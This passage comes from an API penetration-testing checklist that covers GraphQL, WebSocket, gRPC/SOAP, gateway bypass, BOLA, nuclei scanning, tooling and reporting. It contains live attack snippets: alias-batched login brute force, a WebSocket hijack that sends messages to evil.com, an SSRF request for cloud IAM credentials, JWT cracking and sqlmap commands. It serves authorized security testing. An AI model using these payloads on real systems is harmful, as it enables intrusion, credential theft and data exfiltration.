            friends { id name }
          }
        }
      }
    }
  }
}

# Alias-based batching (rate limit bypass / brute force)
query {
  a0: login(username:"admin", password:"0000") { token }
  a1: login(username:"admin", password:"0001") { token }
  a2: login(username:"admin", password:"0002") { token }
  # ... repeat 100+ times
}

# Array batching (another rate limit bypass technique)
[
  {"query": "{ login(username:\"admin\", password:\"0000\") { token } }"},
  {"query": "{ login(username:\"admin\", password:\"0001\") { token } }"}
]
```
- [ ] Test **query depth limit**: how many levels of nesting before error?
- [ ] Test **query complexity limit**: large `first: 9999` arguments on list resolvers
- [ ] Test **alias-based brute force** on OTP/login mutations — 100 attempts per HTTP request
- [ ] Test **field duplication** in query

### 8.4 GraphQL Injections
- [ ] Test all string arguments for SQLi, NoSQLi, SSTI, command injection
- [ ] Test for **variable injection**: pass untrusted variables, check for insufficient sanitization
- [ ] Test **directive injection**: `@skip`, `@include` with attacker-controlled conditions
- [ ] Test **fragment manipulation** for data exposure

---

## PHASE 9 — WEBSOCKET TESTING

> **References:** OWASP WSTG-CLNT-10 | CWE-287, CWE-345

- [ ] Test **authentication**: is WS connection authenticated? Can you connect without token?
- [ ] Test **authorization**: can you subscribe to other users' channels/rooms?
- [ ] Test **input validation**: inject JSON payloads, XSS, SQLi, command injection in WS messages
- [ ] Test **CSWSH (Cross-Site WebSocket Hijacking)**: is `Origin` header validated?
  ```javascript
  // Test if WS handshake allows arbitrary Origin
  // If no Origin validation → CSWSH → read victim's private messages
  var ws = new WebSocket("wss://target.com/ws");
  ws.onmessage = function(e) { fetch("https://evil.com/?d=" + e.data); }
  ```
- [ ] Intercept and replay WS messages via Burp (WebSocket history tab)
- [ ] Test for **race conditions** in WS message processing

---

## PHASE 10 — gRPC / SOAP / OTHER PROTOCOL TESTING

### 10.1 gRPC
```bash
# List services (reflection enabled?)
grpcurl -plaintext target.com:50051 list

# List methods
grpcurl -plaintext target.com:50051 describe ServiceName

# Invoke method
grpcurl -plaintext -d '{"user_id": "1337"}' target.com:50051 UserService/GetUser

# Burp Suite: use gRPC extension for proxying
```
- [ ] Test if **server reflection** is enabled (equivalent to introspection) — exposes full service definition
- [ ] Test all RPC methods for BOLA/BFLA using separate test accounts
- [ ] Fuzz protobuf fields with Burp Suite gRPC extension or `protoc` + custom fuzzer

### 10.2 SOAP / XML Web Services
```bash
# WSDL discovery
https://target.com/service?wsdl
https://target.com/ws/service.wsdl

# Parse WSDL with SoapUI or WSDLer (Burp extension)
# Test all operations with:
# - XXE
# - SQLi in parameter values
# - IDOR on object IDs
# - Missing auth on operations
```

---

## PHASE 11 — UNSAFE API CONSUMPTION (API10:2023)

> Testing APIs that consume third-party services.  
> **References:** OWASP API10:2023 | CWE-918, CWE-295

- [ ] Does the API blindly trust data from upstream third-party APIs without validation?
- [ ] Can you manipulate responses from webhooks/callbacks the API processes?
- [ ] Test **webhook endpoint poisoning**: can you register malicious webhook URL to receive other users' events?
- [ ] Check if API processes **user-controlled redirects** from third-party OAuth flows
- [ ] Test for **SSRF** through third-party integration URLs (`payment_redirect`, `oauth_callback`)
- [ ] Check for **insufficient output encoding** of data retrieved from third-party APIs

---

## PHASE 12 — ADVANCED & CHAINED ATTACK TECHNIQUES

### 12.1 Chaining for Maximum Impact
Common high-impact chains seen in bug bounty reports:
- [ ] **BOLA + Mass Assignment** → Read another user's object ID, then mass-assign admin role on your own account
- [ ] **Excessive Data Exposure + BOLA** → Harvest UUIDs from a verbose response, then use them in BOLA attacks
- [ ] **SSRF + Cloud Metadata** → SSRF to AWS/GCP/Azure metadata endpoint → extract IAM credentials → full cloud takeover
- [ ] **JWT Weak Secret + BFLA** → Crack JWT, forge admin token, call admin endpoints
- [ ] **XXE + SSRF** → XXE to read internal SSRF targets, escalate to RCE via internal services
- [ ] **Open Redirect + OAuth** → Steal auth code / access token via redirect_uri manipulation
- [ ] **Race Condition + Business Logic** → Bypass "one coupon per user" limits, double-spend credits
- [ ] **BFLA + Improper Assets Management** → Find deprecated v1 endpoint without auth, call admin function

### 12.2 API Gateway / Proxy Bypass
```bash
# Try bypassing API gateway rate limits / WAF
# Path variations
/api/v1/users          # Blocked?
/api/v1/users/         # Trailing slash
/api/v1//users         # Double slash
/api/v1/users%20       # URL encoding
/api/v1/users%2e       # Dot encoding
/%61pi/v1/users        # Char encoding of 'a'
/api/v1/users;param=x  # Semicolon injection

# Case sensitivity bypass
/API/V1/Users
/Api/V1/users

# Method override headers
X-HTTP-Method-Override: GET
X-Method-Override: GET
_method=GET

# Host header manipulation (for internal routing)
Host: internal-service
X-Forwarded-Host: admin.internal
X-Host: admin.internal
```

### 12.3 Broken Object Level Authorization — Advanced
```bash
# Type juggling: try different ID types
GET /api/v1/users/1337          # Integer
GET /api/v1/users/1337.0        # Float  
GET /api/v1/users/1337a         # Alphanumeric
GET /api/v1/users/01337         # Octal-style leading zero
GET /api/v1/users/[1337]        # Array
GET /api/v1/users/{"id":1337}   # JSON object

# Wildcard / glob patterns
GET /api/v1/users/*
GET /api/v1/users/%2a

# Test object access via different relationship paths
GET /api/v1/organizations/1/users/1337
GET /api/v1/teams/1/members/1337
GET /api/v1/orders/1337/invoice
```

---

## PHASE 13 — NUCLEI AUTOMATED SCANNING

```bash
# Run Nuclei against discovered API endpoints
nuclei -u https://target.com -t /path/to/nuclei-templates/

# API-specific templates
nuclei -u https://target.com -t /path/to/nuclei-templates/exposures/apis/
nuclei -u https://target.com -t /path/to/nuclei-templates/vulnerabilities/other/
nuclei -u https://target.com -t /path/to/nuclei-templates/misconfiguration/

# Spring Boot Actuator
nuclei -u https://target.com -t /nuclei-templates/exposures/configs/spring-actuator.yaml

# JWT null algorithm
nuclei -u https://target.com -t /nuclei-templates/vulnerabilities/generic/jwt-none-alg.yaml

# GraphQL introspection
nuclei -u https://target.com -t /nuclei-templates/exposures/apis/graphql-introspection.yaml

# Swagger exposure
nuclei -u https://target.com -t /nuclei-templates/exposures/apis/swagger-ui.yaml

# Run with tags
nuclei -u https://target.com -tags api,jwt,graphql,ssrf,cors

# Scan from list of endpoints
nuclei -l endpoints.txt -t /path/to/nuclei-templates/ -severity critical,high,medium
```

---

## PHASE 14 — TOOLING REFERENCE

### Primary Tools

| Tool | Use Case | Command / Link |
|---|---|---|
| **Burp Suite Pro** | Proxy, active scan, intruder, repeater | `burpsuite` |
| **Autorize** (Burp) | BOLA/BFLA automated testing | Extension manager |
| **JWT Editor** (Burp) | JWT tampering, key confusion | Extension manager |
| **InQL** (Burp) | GraphQL schema extraction + testing | Extension manager |
| **Param Miner** (Burp) | Hidden parameter discovery | Extension manager |
| **ffuf** | Endpoint / parameter fuzzing | `github.com/ffuf/ffuf` |
| **Kiterunner** | Context-aware API route brute-force | `github.com/assetnote/kiterunner` |
| **Arjun** | HTTP parameter discovery | `github.com/s0md3v/Arjun` |
| **jwt_tool** | JWT attack suite | `github.com/ticarpi/jwt_tool` |
| **sqlmap** | SQL injection automation | `sqlmap.org` |
| **ghauri** | Modern SQL injection tool | `github.com/r0oth3x49/ghauri` |
| **nuclei** | Template-based vulnerability scanner | `github.com/projectdiscovery/nuclei` |
| **dalfox** | XSS parameter analysis | `github.com/hahwul/dalfox` |
| **grpcurl** | gRPC API testing | `github.com/fullstorydev/grpcurl` |
| **SoapUI** | SOAP/WSDL testing | `soapui.org` |
| **mitmproxy** | Scriptable HTTP/HTTPS proxy | `mitmproxy.org` |
| **httpie** | Human-friendly curl | `httpie.io` |
| **trufflehog** | Secret scanning in git/files | `github.com/trufflesecurity/trufflehog` |
| **gitleaks** | Git secret detection | `github.com/gitleaks/gitleaks` |
| **katana** | JS-aware crawling | `github.com/projectdiscovery/katana` |
| **subfinder** | Subdomain enumeration | `github.com/projectdiscovery/subfinder` |
| **testssl.sh** | TLS/SSL testing | `testssl.sh` |
| **Turbo Intruder** (Burp) | Race conditions, high-speed fuzzing | Extension manager |
| **Hackvertor** (Burp) | Encoding/transformation | Extension manager |
| **Upload Scanner** (Burp) | File upload exploitation | Extension manager |

### Wordlists

| Wordlist | Path / Link |
|---|---|
| SecLists API endpoints | `SecLists/Discovery/Web-Content/api/` |
| Common API endpoints (mazen160) | `SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt` |
| Assetnote HTTP Archive API Routes | `wordlists.assetnote.io` → `httparchive_apiroutes_*.txt` |
| Assetnote Kiterunner Routes | `wordlists.assetnote.io` → `*.kite` files |
| Burp parameter names | `SecLists/Discovery/Web-Content/burp-parameter-names.txt` |
| fuzzdb common methods | `fuzzdb/discovery/common-methods/common-methods.txt` |
| API objects wordlist | `github.com/chrislockard/api_wordlist` |
| GraphQL wordlist | `SecLists/Discovery/Web-Content/graphql.txt` |
| JWT secrets | `SecLists/Passwords/` + `rockyou.txt` |

---

## PHASE 15 — REPORTING

### Severity Classification

| CVSS | Rating | Example |
|---|---|---|
| 9.0–10.0 | Critical | BOLA → mass PII dump, RCE, full auth bypass |
| 7.0–8.9 | High | BFLA admin takeover, SSRF to cloud metadata, SQLi |
| 4.0–6.9 | Medium | Excessive data exposure, CORS misconfiguration, JWT weak secret |
| 0.1–3.9 | Low | Missing security headers, verbose error messages, info disclosure |

### Per-Finding Documentation Template
```
## Finding: [Vulnerability Name]

**Severity:** Critical / High / Medium / Low
**OWASP API Top 10:** API1:2023 / API2:2023 / ...
**CWE:** CWE-XXX
**CVSS 3.1 Score:** X.X (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

### Description
[1-2 sentence summary]

### Affected Endpoint
Method: GET / POST / PUT / PATCH / DELETE
URL: https://target.com/api/v1/endpoint
Authentication Required: Yes / No

### Proof of Concept
[Full HTTP request + response, redacted of sensitive data]
[Screenshots, video if applicable]

### Impact
[Specific business impact: data accessible, accounts at risk, financial impact]

### Remediation
[Specific, actionable fix with code example if possible]

### References
- OWASP: [link]
- CWE: [link]
- CVSSv3 Calculator: [link]
```

### Report Structure (PTES-aligned)
1. Executive Summary (non-technical, business risk language)
2. Scope & Methodology
3. Attack Surface Summary (endpoints tested, versions, auth mechanisms)
4. Findings (sorted by severity, full PoC for each)
5. Risk Register (table: Finding | Severity | Status | Remediation Owner)
6. Remediation Roadmap (short-term / long-term)
7. Appendix: All tested endpoints, tools used, raw evidence

---

## QUICK REFERENCE — OWASP API Top 10 (2023) Mapping

| ID | Name | CWE | Priority Tests |
|---|---|---|---|
| **API1:2023** | Broken Object Level Authorization (BOLA) | CWE-639, CWE-284 | IDOR with 2 accounts + Autorize |
| **API2:2023** | Broken Authentication | CWE-287, CWE-345 | JWT attacks, brute force, OAuth flows |
| **API3:2023** | Broken Object Property Level Authorization | CWE-213, CWE-915 | Excessive data exposure + Mass assignment |
| **API4:2023** | Unrestricted Resource Consumption | CWE-770, CWE-400 | Rate limit bypass, pagination abuse |
| **API5:2023** | Broken Function Level Authorization (BFLA) | CWE-285 | Admin endpoints with user token |
| **API6:2023** | Unrestricted Access to Sensitive Business Flows | CWE-840 | Race conditions, workflow bypass |
| **API7:2023** | Server Side Request Forgery | CWE-918 | SSRF to cloud metadata, internal services |
| **API8:2023** | Security Misconfiguration | CWE-16, CWE-200 | CORS, headers, verbose errors, debug endpoints |
| **API9:2023** | Improper Inventory Management | CWE-1059 | Old API versions, shadow endpoints |
| **API10:2023** | Unsafe Consumption of APIs | CWE-918, CWE-295 | Third-party webhook/callback manipulation |

---

## QUICK COMMAND CHEATSHEET

```bash
# ── DISCOVERY ──────────────────────────────────────────────────────────────
# Endpoint fuzzing
ffuf -u https://TARGET/api/FUZZ -w apiroutes.txt -mc 200,201,401,403 -t 50

# Kiterunner
kr scan https://TARGET/api -A=apiroutes-240128.txt -x 20

# JS endpoint extraction
katana -u https://TARGET -jc -d 5 | grep -E '/api/|graphql' | sort -u

# Historical URLs
gau --subs TARGET | grep -Ei '/(api|v[0-9]|graphql)' | sort -u

# ── JWT ──────────────────────────────────────────────────────────────────
jwt_tool <TOKEN> -M at                       # All attacks
jwt_tool <TOKEN> -X n                        # none alg
jwt_tool <TOKEN> -X a                        # RS256→HS256 confusion
hashcat -a 0 -m 16500 <JWT> rockyou.txt      # Crack secret

# ── BOLA ─────────────────────────────────────────────────────────────────
# Sequential ID test
for i in $(seq 1 100); do curl -s -H "Authorization: Bearer <TOKEN_B>" https://TARGET/api/v1/items/$i | jq '.owner_id'; done

# ── SSRF ─────────────────────────────────────────────────────────────────
curl -s -X POST https://TARGET/api/v1/fetch -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# ── GRAPHQL ──────────────────────────────────────────────────────────────
# Introspection
curl -X POST https://TARGET/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'

# ── NUCLEI ───────────────────────────────────────────────────────────────
nuclei -u https://TARGET -tags api,jwt,graphql,ssrf,cors,exposure -severity critical,high

# ── PARAMETER DISCOVERY ──────────────────────────────────────────────────
arjun -u https://TARGET/api/v1/user -m POST --json -t 10

# ── SQL INJECTION ────────────────────────────────────────────────────────
sqlmap -u "https://TARGET/api/v1/users?id=1" --batch --dbs --level=3 --risk=2

# ── SECRET SCANNING ──────────────────────────────────────────────────────
trufflehog github --org=TARGET_ORG --token=$GH_TOKEN --json | jq '.SourceMetadata'
```

---

*Checklist maintained based on: OWASP API Security Top 10 (2023) · HackerOne Disclosed Reports · PortSwigger Research · GitHub: shieldfy/API-Security-Checklist · assetnote/kiterunner · riteshs4hu/API-Pentesting-Resources · WSTG v4.2 · PTES · NIST SP 800-115*

*"The best API pentest = 20% tools, 80% logic. Focus on business logic, state transitions, and trust boundaries."*
